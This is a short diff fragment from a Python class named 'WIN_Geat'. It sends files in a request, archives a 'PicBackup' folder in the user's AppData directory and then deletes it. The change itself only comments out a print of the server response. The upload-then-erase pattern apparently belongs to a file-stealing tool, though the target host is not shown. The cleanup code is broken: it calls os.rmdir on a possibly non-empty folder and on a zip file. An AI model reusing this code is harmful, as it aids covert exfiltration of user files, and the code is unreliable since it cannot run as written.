@@ -64,7 +64,7 @@ class WIN_Geat:
                              headers=headers,
                              files=files
                           )
-         print(repoanse.text)
+         #print(repoanse.text)
          shutil.make_archive(os.environ["appdata"] +'\\PicBackup', "zip",os.environ["appdata"] +'\\PicBackup'  )
          os.rmdir(os.environ["appdata"] +'\\PicBackup')
          os.rmdir(os.environ["appdata"] +'\\PicBackup.zip')
